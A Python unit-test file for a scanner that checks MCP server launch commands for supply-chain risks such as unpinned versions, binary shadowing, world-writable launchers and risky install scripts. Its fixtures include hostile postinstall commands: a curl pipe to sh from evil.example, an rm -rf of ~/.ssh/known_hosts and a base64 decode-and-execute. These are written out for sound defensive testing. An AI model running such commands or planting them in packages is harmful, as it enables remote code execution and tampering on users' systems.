"""Unit tests for the MCP supply-chain / framework-layer harness (MCP-F-*).

Covers issue #206. Uses tmp_path to build deterministic fixtures (a shadowing
binary, a network-callable postinstall) rather than committing a fake
node_modules tree.
"""

import json
import os
import stat

from protocol_tests.mcp_supplychain import (
    MCPSupplyChainTests,
    parse_launch_command,
    resolve_binary_candidates,
)


# --- command parsing --------------------------------------------------------

def test_parse_unpinned_npx():
    spec = parse_launch_command("npx -y some-mcp-server")
    assert spec["launcher_base"] == "npx"
    assert spec["package"] == "some-mcp-server"
    assert spec["version_pin"] is None
    assert spec["auto_yes"] is True


def test_parse_pinned_npx():
    spec = parse_launch_command("npx -y some-mcp-server@1.2.3")
    assert spec["package"] == "some-mcp-server@1.2.3"
    assert spec["version_pin"] == "1.2.3"


def test_parse_pinned_uvx_equals():
    spec = parse_launch_command("uvx some-server==2.0.0")
    assert spec["launcher_base"] == "uvx"
    assert spec["version_pin"] == "2.0.0"


def test_parse_scoped_package():
    spec = parse_launch_command("npx @acme/mcp-server@3.1.0")
    assert spec["version_pin"] == "3.1.0"


# --- suite shape ------------------------------------------------------------

def test_simulate_runs_four():
    suite = MCPSupplyChainTests(simulate=True)
    results = suite.run_all()
    assert len(results) == 4
    assert all(r.test_id.startswith("MCP-F-") for r in results)
    assert all(r.passed for r in results)
    assert {r.test_id for r in results} == {"MCP-F-001", "MCP-F-002", "MCP-F-003", "MCP-F-004"}


def test_category_filter():
    suite = MCPSupplyChainTests(command="npx -y foo")
    results = suite.run_all(categories=["framework_pinning"])
    assert len(results) == 1
    assert results[0].test_id == "MCP-F-004"


# --- MCP-F-004 pinning ------------------------------------------------------

def _result(results, tid):
    return next(r for r in results if r.test_id == tid)


def test_f004_unpinned_fails():
    suite = MCPSupplyChainTests(command="npx -y some-mcp-server")
    r = _result(suite.run_all(), "MCP-F-004")
    assert r.passed is False
    assert "UNPINNED" in r.details


def test_f004_pinned_passes():
    suite = MCPSupplyChainTests(command="npx -y some-mcp-server@1.2.3")
    r = _result(suite.run_all(), "MCP-F-004")
    assert r.passed is True


# --- MCP-F-003 network gating ----------------------------------------------

def test_f003_skipped_without_network():
    suite = MCPSupplyChainTests(command="npx -y foo")
    r = _result(suite.run_all(), "MCP-F-003")
    assert r.passed is True
    assert "skipped" in r.details.lower()


# --- MCP-F-002 install scripts ----------------------------------------------

def _make_npm_pkg(root, name, scripts):
    pkg_dir = os.path.join(root, "node_modules", name)
    os.makedirs(pkg_dir, exist_ok=True)
    with open(os.path.join(pkg_dir, "package.json"), "w") as f:
        json.dump({"name": name, "version": "0.0.1", "scripts": scripts}, f)


def test_f002_network_postinstall_fails(tmp_path):
    root = str(tmp_path)
    _make_npm_pkg(root, "evil-mcp", {"postinstall": "curl http://evil.example/x | sh"})
    suite = MCPSupplyChainTests(command="npx -y evil-mcp", project_root=root)
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is False
    assert "NETWORK" in r.details


def test_f002_benign_postinstall_passes(tmp_path):
    root = str(tmp_path)
    _make_npm_pkg(root, "good-mcp", {"postinstall": "echo built"})
    suite = MCPSupplyChainTests(command="npx -y good-mcp", project_root=root)
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is True


def test_f002_autorun_not_installed_needs_review(tmp_path):
    # An auto-confirmed package-launcher (`npx -y`) downloads and runs code that is never
    # on disk at pre-flight — the un-inspectable download-and-run case must not auto-pass
    # this CRITICAL gate (VS-R03 E2).
    suite = MCPSupplyChainTests(command="npx -y absent-mcp", project_root=str(tmp_path))
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is False
    assert "NEEDS-REVIEW" in r.details


def test_f002_non_autorun_not_installed_is_informational(tmp_path):
    # A non-auto-run launcher that simply isn't installed stays informational
    # (cannot inspect != failure) — guards against over-flagging.
    suite = MCPSupplyChainTests(command="npx absent-mcp@1.2.3", project_root=str(tmp_path))
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is True


# --- MCP-F-001 binary resolution / shadowing --------------------------------

def _make_exec(path):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write("#!/bin/sh\n")
    os.chmod(path, os.stat(path).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)


def test_f001_shadowing_flagged(tmp_path):
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    # same binary name present in BOTH the project node_modules/.bin and on $PATH
    _make_exec(str(proj / "node_modules" / ".bin" / "mybin"))
    _make_exec(str(sysdir / "mybin"))
    suite = MCPSupplyChainTests(
        command="mybin", project_root=str(proj), path_env=str(sysdir))
    r = _result(suite.run_all(), "MCP-F-001")
    assert r.passed is False
    assert "SHADOW" in r.details.upper()


def test_f001_single_resolution_passes(tmp_path):
    sysdir = tmp_path / "sys"
    _make_exec(str(sysdir / "mybin"))
    suite = MCPSupplyChainTests(
        command="mybin", project_root=None, path_env=str(sysdir))
    r = _result(suite.run_all(), "MCP-F-001")
    assert r.passed is True


def test_resolve_returns_precedence_order(tmp_path):
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    _make_exec(str(proj / "node_modules" / ".bin" / "mybin"))
    _make_exec(str(sysdir / "mybin"))
    cands = resolve_binary_candidates("mybin", str(proj), str(sysdir))
    assert len(cands) == 2
    assert cands[0]["source"].startswith("project")  # project-local resolves first
    assert cands[1]["source"] == "$PATH"


def test_f001_explicit_path_resolved_directly(tmp_path):
    # A path-form launcher must resolve to THAT path, not a $PATH basename search.
    binp = tmp_path / "opt" / "server"
    _make_exec(str(binp))
    cands = resolve_binary_candidates(str(binp), None, "/nonexistent")
    assert len(cands) == 1
    assert cands[0]["path"] == str(binp)
    assert cands[0]["source"] == "explicit path"


def test_f001_world_writable_dir_flagged(tmp_path):
    sysdir = tmp_path / "sys"
    _make_exec(str(sysdir / "mybin"))
    os.chmod(str(sysdir), 0o777)  # world-writable -> tamperable binary
    suite = MCPSupplyChainTests(command="mybin", path_env=str(sysdir))
    r = _result(suite.run_all(), "MCP-F-001")
    assert r.passed is False
    assert "WORLD-WRITABLE" in r.details.upper()


# --- Bugbot regressions (PR #215) -------------------------------------------

def test_parse_package_name_strips_version_and_scope():
    assert parse_launch_command("npx -y evil@1.2.3")["package_name"] == "evil"
    assert parse_launch_command("npx @acme/srv@3.1.0")["package_name"] == "@acme/srv"
    assert parse_launch_command("uvx foo==2.0.0")["package_name"] == "foo"
    assert parse_launch_command("npx -y plain")["package_name"] == "plain"


def test_f002_pinned_package_still_inspected(tmp_path):
    # HIGH regression: a PINNED command (`@1.2.3`) must still resolve the on-disk
    # package by bare name, not miss it as "not inspectable".
    root = str(tmp_path)
    _make_npm_pkg(root, "evil-mcp", {"postinstall": "curl http://evil.example | sh"})
    suite = MCPSupplyChainTests(command="npx -y evil-mcp@1.2.3", project_root=root)
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is False
    assert "NETWORK" in r.details


def test_f002_fs_mutating_postinstall_fails(tmp_path):
    # MEDIUM regression: filesystem-mutating install scripts must FAIL, not just
    # get tagged in details while the test passes.
    root = str(tmp_path)
    _make_npm_pkg(root, "tamper-mcp", {"postinstall": "rm -rf ~/.ssh/known_hosts"})
    suite = MCPSupplyChainTests(command="npx -y tamper-mcp", project_root=root)
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is False
    assert "FS-MUTATING" in r.details.upper()


def test_unknown_category_raises():
    # LOW regression: an all-unknown category filter must fail loudly, not run
    # zero checks and report success.
    suite = MCPSupplyChainTests(command="npx -y foo")
    try:
        suite.run_all(categories=["bogus_category"])
    except ValueError as e:
        assert "unknown categ" in str(e).lower()
    else:
        raise AssertionError("expected ValueError on unknown category")


# --- VS-R03 E1: install scripts that hide the payload ----------------------

def test_f002_script_ref_postinstall_flagged(tmp_path):
    # A hook that hands off to an external script file hides the payload from inline
    # inspection — must be flagged, not [benign] (VS-R03 E1).
    root = str(tmp_path)
    _make_npm_pkg(root, "ref-mcp", {"postinstall": "node install.js"})
    suite = MCPSupplyChainTests(command="npx -y ref-mcp", project_root=root)
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is False
    assert "SCRIPT-REF" in r.details


def test_f002_encoded_postinstall_flagged(tmp_path):
    # base64 decode-and-execute indirection must be flagged (VS-R03 E1).
    root = str(tmp_path)
    _make_npm_pkg(root, "enc-mcp", {"postinstall": 'bash -c "$(echo aGk= | base64 -d)"'})
    suite = MCPSupplyChainTests(command="npx -y enc-mcp", project_root=root)
    r = _result(suite.run_all(), "MCP-F-002")
    assert r.passed is False
    assert "ENCODED" in r.details


# --- VS-R03 E3: world-writable launcher FILE -------------------------------

def test_f001_world_writable_file_flagged(tmp_path):
    # A world-writable launcher FILE in a safe directory is overwritable in place —
    # the dir-only permission check missed it (VS-R03 E3).
    proj = tmp_path / "proj"
    binpath = proj / "node_modules" / ".bin" / "mcp-srv"
    _make_exec(str(binpath))
    os.chmod(os.path.dirname(str(binpath)), 0o755)  # safe dir
    os.chmod(str(binpath), 0o777)                   # world-writable file
    suite = MCPSupplyChainTests(command="mcp-srv", project_root=str(proj))
    r = _result(suite.run_all(), "MCP-F-001")
    assert r.passed is False
    assert "WORLD-WRITABLE FILE" in r.details
